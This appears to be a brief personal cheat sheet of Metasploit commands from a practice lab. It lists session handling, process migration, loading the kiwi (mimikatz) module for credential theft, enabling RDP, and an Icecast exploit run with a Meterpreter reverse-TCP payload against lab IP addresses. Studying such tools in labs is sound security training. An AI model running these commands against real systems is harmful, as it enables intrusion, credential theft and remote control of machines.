---
title: 'RP: Metasploit'
---


```bash
sudo msfdb init
msfconsole
db_nmap <nmap commands> 

set LHOST <local ip from  ip addr>
set RHOST <target ip>

jobs

sessions
sessions -i 1

migrate # move to another process

getuid
getprivs
sysinfo

load kiwi # new version of mimikatz

upload # file

run post/windows/gather/checkvm
run post/multi/recon/local_exploit_suggester # to elevate privileges
run post/windows/manage/enable_rdp

shell
bg

use exploit/windows/http/icecast_header

set PAYLOAD windows/meterpreter/reverse_tcp
set LHOST 10.4.5.126
use icecast
set RHOST 10.10.173.148
run
# into meterpreter

proxychains
```